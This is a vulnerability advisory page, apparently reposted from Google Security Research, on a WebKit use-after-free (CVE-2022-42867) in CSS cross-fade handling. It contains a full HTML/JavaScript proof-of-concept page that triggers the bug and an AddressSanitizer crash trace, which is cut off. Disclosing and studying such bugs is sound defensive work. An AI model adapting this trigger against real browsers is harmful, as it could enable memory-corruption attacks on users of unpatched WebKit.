---
title: WebKit CSSCrossfadeValue::crossfadeChanged Use-After-Free
url: https://cxsecurity.com/issue/WLB-2023010020
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-16
fetch_date: 2025-10-04T03:58:26.685659
---

# WebKit CSSCrossfadeValue::crossfadeChanged Use-After-Free

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WebKit CSSCrossfadeValue::crossfadeChanged Use-After-Free** **2023.01.15**  Credit:  **[Google Security Research](https://cxsecurity.com/author/Google%2BSecurity%2BResearch/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-42867](https://cxsecurity.com/cveshow/CVE-2022-42867/ "Click to see CVE-2022-42867")**  CWE: **N/A** | |

WebKit: Use-after-free of RenderMathMLToken in CSSCrossfadeValue::crossfadeChanged
There is a use-after-free of a RenderMathMLToken object in CSSCrossfadeValue::crossfadeChanged.
CSSCrossfadeValue extends CSSImageGeneratorValue. CSSImageGeneratorValue keeps a HashCountedSet of clients (m\_clients) of the image. The RenderMathMLToken object is one of these clients. When the RenderMathMLToken object is freed, I think it should be removed from the client list via RenderElement::willBeDestroyed, but this isn't occurring. CSSCrossfadeValue::crossfadeChanged will then iterate through the client list which includes the dangling pointer to the RenderMathMLToken object, thus causing the use-after-free.
Vulnerability confirmed on ASAN build of WebKit on OSX and WebkitGTK as of commit fe4b1d3bf61e8999ccd68da789905e92f8ffc9e3
=================
Proof of Concept
=================
<!-- saved from url=(0014)about:internet -->
<html>
<style>
.class1 { shape-outside: url(data:image/gif;base64,R0lGODlhEAAQAMQAAORHHOVSKudfOulrSOp3WOyDZu6QdvCchPGolfO0o/XBs/fNwfjZ0frl3/zy7////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkAABAALAAAAAAQABAAAAVVICSOZGlCQAosJ6mu7fiyZeKqNKToQGDsM8hBADgUXoGAiqhSvp5QAnQKGIgUhwFUYLCVDFCrKUE1lBavAViFIDlTImbKC5Gm2hB0SlBCBMQiB0UjIQA7); }
msub::first-line { background-image: cross-fade(url(abc), url(data:image/gif;base64,R0lGODlhEAAQAMQAAORHHOVSKudfOulrSOp3WOyDZu6QdvCchPGolfO0o/XBs/fNwfjZ0frl3/zy7////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkAABAALAAAAAAQABAAAAVVICSOZGlCQAosJ6mu7fiyZeKqNKToQGDsM8hBADgUXoGAiqhSvp5QAnQKGIgUhwFUYLCVDFCrKUE1lBavAViFIDlTImbKC5Gm2hB0SlBCBMQiB0UjIQA7), 50%); }
</style>
<script>
function trigger() {
document.getElementsByTagName(\"style\")[0].appendChild(document.createElement(\"a\"));
setTimeout( () => {
msubEle.prepend(\"1\");
mathEle.focus() // This can be a few different calls. setSelectionRange also worked
mathEle.remove();
}, 0);
}
</script>
<body onload=trigger()>
<math id=\"mathEle\" class=\"class1\">
<msub id=\"msubEle\">
<mi></mi>
</msub>
</math>
</body>
</html>
===================
ASAN
===================
=================================================================
==704==ERROR: AddressSanitizer: heap-use-after-free on address 0x6110000cc8c0 at pc 0x0001595e72c0 bp 0x7ff7b3b162f0 sp 0x7ff7b3b162e8
READ of size 8 at 0x6110000cc8c0 thread T0
==704==WARNING: failed to spawn external symbolizer (errno: 2)
==704==WARNING: Failed to use and restart external symbolizer!
#0 0x1595e72bf in WebCore::CSSCrossfadeValue::crossfadeChanged()+0x28f (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x35412bf)
#1 0x1595e7018 in WebCore::CSSCrossfadeValue::SubimageObserver::imageChanged(WebCore::CachedImage\*, WebCore::IntRect const\*)+0x28 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x3541018)
#2 0x15aae8504 in WebCore::CachedImage::notifyObservers(WebCore::IntRect const\*)+0x114 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x4a42504)
#3 0x15aaeb6ad in WebCore::CachedImage::finishLoading(WebCore::FragmentedSharedBuffer const\*, WebCore::NetworkLoadMetrics const&)+0x1cd (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x4a456ad)
#4 0x15aa664ef in WebCore::SubresourceLoader::didFinishLoading(WebCore::NetworkLoadMetrics const&)+0x62f (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x49c04ef)
#5 0x15aa5ab0e in auto WebCore::ResourceLoader::loadDataURL()::$\_3::operator()<std::\_\_1::optional<WebCore::DataURLDecoder::Result> >(std::\_\_1::optional<WebCore::DataURLDecoder::Result>)::'lambda'()::operator()() const+0x20e (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x49b4b0e)
#6 0x15aa5a7ec in WTF::Detail::CallableWrapper<auto WebCore::ResourceLoader::loadDataURL()::$\_3::operator()<std::\_\_1::optional<WebCore::DataURLDecoder::Result> >(std::\_\_1::optional<WebCore::DataURLDecoder::Result>)::'lambda'(), void>::call()+0xc (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x49b47ec)
#7 0x1560c728e in WTF::Function<void ()>::operator()() const+0x3e (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x2128e)
#8 0x15613e34e in WTF::CompletionHandler<void ()>::operator()()+0xbe (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x9834e)
#9 0x1584adc9a in WTF::CompletionHandlerCallingScope::~CompletionHandlerCallingScope()+0x1a (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x2407c9a)
#10 0x1584a37f8 in WTF::CompletionHandlerCallingScope::~CompletionHandlerCallingScope()+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x23fd7f8)
#11 0x15aa76111 in WebCore::SubresourceLoader::didReceiveResponse(WebCore::ResourceResponse const&, WTF::CompletionHandler<void ()>&&)::$\_9::~$\_9()+0x11 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x49d0111)
#12 0x15aa6af98 in WebCore::SubresourceLoader::didReceiveResponse(WebCore::ResourceResponse const&, WTF::CompletionHandler<void ()>&&)::$\_9::~$\_9()+0x8 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86\_64+0x49c4f98)
#13 0x15aa81ff4 in WTF::Detail::CallableWrapper<WebCore::SubresourceLoader::didReceiveResponse(WebCore::ResourceResponse const&, WTF::CompletionHandler<void ()>&&)::$\_9, void>::~CallableWrapper()+0x34 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framewo...